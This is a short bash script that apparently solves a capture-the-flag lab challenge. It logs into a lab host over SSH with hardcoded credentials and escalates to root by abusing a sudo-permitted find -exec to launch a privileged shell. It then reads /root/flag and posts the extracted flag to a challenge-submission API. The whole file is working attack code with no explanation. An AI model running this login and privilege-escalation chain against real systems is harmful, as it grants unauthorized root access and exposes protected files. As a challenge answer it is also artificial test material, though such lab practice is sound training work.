#!/usr/bin/env bash
set -euo pipefail

HOST=172.20.0.141
USER=cityops
PASSWORD='NeonTransit-47'
CHALLENGE_ID=scl-challenge-frame-5b2560

nmap -Pn -p 22 "$HOST" >/dev/null
REMOTE_OUTPUT=$(sshpass -p "$PASSWORD" ssh \
  -o StrictHostKeyChecking=no \
  -o UserKnownHostsFile=/dev/null \
  -o PreferredAuthentications=password \
  -o PubkeyAuthentication=no \
  "$USER@$HOST" \
  "sudo -n /usr/bin/find /tmp -maxdepth 0 -exec /bin/bash -p -c 'cat /root/flag; cat /root/.escalation-proof' \\; -quit")
printf '%s\n' "$REMOTE_OUTPUT"

FLAG=$(printf '%s\n' "$REMOTE_OUTPUT" | grep -oE 'BSY\{[^}]+\}' | head -n 1)
if [[ -z "$FLAG" ]]; then
  echo 'Could not extract a BSY flag from the root output.' >&2
  exit 1
fi

PAYLOAD=$(python3 -c 'import json,sys; print(json.dumps({"challenge_id":sys.argv[1],"task_id":"task1","flag":sys.argv[2]}))' "$CHALLENGE_ID" "$FLAG")
curl -s http://172.20.0.3/api/challenges/submit -X POST -H 'Content-Type: application/json' --data-binary "$PAYLOAD"
